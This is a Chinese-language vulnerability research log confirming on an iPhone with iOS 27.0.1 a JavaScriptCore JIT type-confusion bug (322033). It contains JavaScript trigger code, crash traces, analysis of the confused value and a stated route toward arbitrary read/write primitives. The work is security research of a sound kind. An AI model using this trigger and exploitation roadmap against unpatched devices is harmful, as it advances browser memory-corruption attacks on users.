# ✅ 真机确认：JSC JIT 类型混淆（bug 322033）—— 修正此前"只能拿到 DoS"的错误结论

**日期**：2026-10-31 23:00
**设备**：iPhone 18,2 / iOS 27.0.1 (24A446)
**入口**：普通 dev-signed app → WKWebView → 纯 JS（无 Worker、无特殊选项）

---

## 一、结论先行

| 项 | 内容 |
|---|---|
| Bugzilla | **322033** |
| 标题 | `GetByStatus::computeFor` 的 prototype walk 跳过基结构的 non-reified 静态属性 |
| 修复 | `d5af1b7159`（27.2）|
| 类别 | **JSC JIT 错误折叠（misfolding）→ 类型混淆** |
| 27.0.1 状态 | **未修补，真机确认** |
| 崩溃类型 | `EXC_BREAKPOINT` @ `JSC::JSCell::toObjectSlow` |

**这推翻了我此前"本环境只能产出 DoS 级 bug"的判断。**
前两个 bug（112695 / 113897）是 WebCore 渲染树 UAF，同步 free/use 无法利用；
而这个是 **JSC 的 JIT 类型混淆**，正是任意读写的标准路径。

## 二、判别实验（排除"环境语义不同"的替代解释）

同一测试内有两处同型断言，仅以 JIT 层级区分：

```
PRE  typeof=undefined  tag=[object Undefined]  eqUndef=true   ← 热循环前（解释执行）完全正确
for (let i=0;i<100000;i++) f(RegExp,0);                       ← 触发 JIT
POST typeof=object                                            ← 热循环后：类型已改变
     → Object.prototype.toString.call(v) 崩溃
```

**输入完全相同（`RegExp.input = "q0002048"`，两处都打印确认），
唯一变量是 JIT 是否已优化。** 因此不是 `RegExp.input` 语义差异。

## 三、崩溃签名

```
com.apple.WebKit.WebContent-2026-10-31-225926.ips
OS: iPhone OS 27.0.1 (24A446)
exception: EXC_BREAKPOINT (SIGKILL)

[ 0] JavaScriptCore  JSC::JSCell::toObjectSlow(JSC::JSGlobalObject*) const
[ 1] JavaScriptCore  JSC::objectProtoFuncToString(...)
[ 2..7] JIT
[ 8] JavaScriptCore  JSC::Interpreter::executeProgram(...)
[10] WebCore         ScriptController::evaluateInWorld(...)
```

`EXC_BREAKPOINT` 是 **JSC 自身完整性校验触发**：`toObject()` 收到的 JSCell 的
`type()` 不是合法对象类型，命中 release 断言。
——即 JIT 发出的值**不是合法 JSCell**。这是类型混淆的直接证据。

## 四、不稳定值观测（指向读取残留内存）

多次运行中 `POST` 的返回值表现不一致：

| 运行 | POST 观测 |
|---|---|
| 1 | `typeof=object` → `shouldBeUndefined` 报 "got a object" |
| 2 | 字符串转换抛 `TypeError: Cannot convert a symbol to a string` |
| 3 | `typeof=object` → `toString.call()` 崩溃 |

同一输入、同一代码，返回值形态在 object / symbol 之间漂移
—— 与"读到相邻残留内存"一致，而非稳定的错误常量。

## 五、触发代码（官方回归测试，剥离 jsc 专用指令）

```js
Function.prototype.input = shadow;       // shadow = {p0:1, y:13.37}
let subject = "q0002048"; subject.match(/.*/);
RegExp.x = 1;                            // 基结构的 non-reified 静态属性

function f(a, n) {
    let b = a;
    if (n > 0) { let r = a.input; return r.y; }
    b.x; b.x; b.x;                       // 预热 RegExp.x 的 GetByStatus
    return undefined;
}
f(RegExp, 1);                            // 正确 → undefined
for (let i = 0; i < 100000; i++) f(RegExp, 0);   // JIT 优化
f(RegExp, 1);                            // 错误 → 非法 JSCell
```

## 六、诚实边界

| 已达成 | 未达成 |
|---|---|
| ✅ JSC JIT 类型混淆，真机确认 | ❌ 把非法 cell 变成"合法但可控"的 cell |
| ✅ 纯 JS、确定性触发 | ❌ 任意读 / 任意写原语 |
| ✅ 崩溃点已定位到 `toObjectSlow` | ❌ 控制混淆值的内容 |

**当前形态**：JSC 的校验把混淆值拦在了 `toObjectSlow`。
往利用走的关键是让混淆值"看起来是合法 JSCell"（例如让它落到一个受控的
对象类型上），从而绕过断言、直接使用该指针。

**方法学修正**：此前"死路"的判断部分来自我自己的工具缺陷——
`noInline` / `describe` 等 JSTest helper 缺失导致脚本在首行就中止，
我把"没跑"当成了"没漏洞"。补齐后立刻命中。

---

## 七、定性深入（23:45 追加）：稳定错误常量，非悬垂指针

### 7.1 复现条件（关键，我曾一度改坏）

**必须有 `setup(setupObj)` 预热**，否则不触发：
```js
function setup(a){ return a.input; }
let setupObj = Object.create(Function.prototype);
for (let i=0;i<5000;i++) setup(setupObj);   // ← 缺这段则 misfold 不出现
```
我省略该段时得到 `preG=string / postG=string / postH=undef`（完全正常），
恢复后立刻得到 `post=OTHER:object`。**这是我第三次因简化复现条件而自造假阴性。**

### 7.2 Worker 内实测（崩溃只影响该 worker）

```
pre      = undef           ← JIT 前：正确
post     = OTHER:object    ← JIT 后：错误
isShadow = false
p0       = undefined       ← 没有 shadow 的 p0
y        = undefined       ← 没有 shadow 的 y
same2    = true            ← 两次调用返回同一对象 → 稳定常量
ctorIsSymbol = true        ← v.constructor === Symbol
```

### 7.3 身份排除

`symProto / Symbol / Object.prototype / Array.prototype / Function.prototype /
Math / JSON / Reflect / globalThis / window` —— **全部 false**。

### 7.4 结论

`typeof === "object"` + `constructor === Symbol` + 无自有属性 + 稳定同一对象
→ 混淆值是一个 **Symbol 包装对象**，即 **CodeBlock 常量池中读到的一个错误常量**。

**这修正了我此前"悬垂指针"的推测。** 它是**确定性的错误常量读**，
不是 UAF。对利用的含义：

| 含义 | 说明 |
|---|---|
| ✅ 稳定可重复 | 每次运行结果一致，利于调试 |
| ❌ 非悬垂指针 | 不能靠 GC + 喷堆回收该内存 |
| ❌ 非任意读 | 常量池内容不由攻击者控制 |
| ⚠️ 仍会崩溃 | `Object.keys` / `toString.call` / `hasOwnProperty` 均触发崩溃 |
| ⚠️ 崩溃点 | `JSC::JSCell::toObjectSlow` 的 release 断言 |

**即：这是一个真实的 JIT 错误折叠漏洞，但目前拿不到内存原语。**
要把"错误常量"升级为"任意读"，需要让常量池里那个槽位装进攻击者可控的对象
——这需要更深的 CodeBlock 常量索引控制，属于另一个层次的工作。
